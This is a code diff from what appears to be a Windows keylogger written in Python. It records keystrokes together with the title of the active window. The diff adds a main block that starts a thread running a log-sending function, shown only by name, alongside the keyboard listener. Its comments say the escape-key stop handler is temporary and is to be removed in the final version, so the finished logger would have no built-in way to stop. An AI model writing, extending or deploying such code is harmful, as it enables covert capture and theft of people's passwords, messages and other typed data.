@@ -34,7 +34,7 @@ delete_file = []
 def on_press(key):
     global old_app
 
-    """Finding the window that is currently used"""
+    """Finding the app what is currently used"""
     new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
     if new_app == 'Cortana':
@@ -134,15 +134,16 @@ def write_file(count):
                 except:
                     pass
 
-
-"""temporary function to stop listening when esc is pressed"""
+"""temporary function to stop listening when esc is pressed - remove it in final version"""
 def on_release(key):
     if key == Key.esc:
         return False
 
-"""keyboard listener"""
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
-
 """Testing"""
+if __name__ == '__main__':
+    t1 = threading.Thread(target=send_logs)
+    t1.start()
+
+    """keyboard listener (dont forget to remove on_release xD"""
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
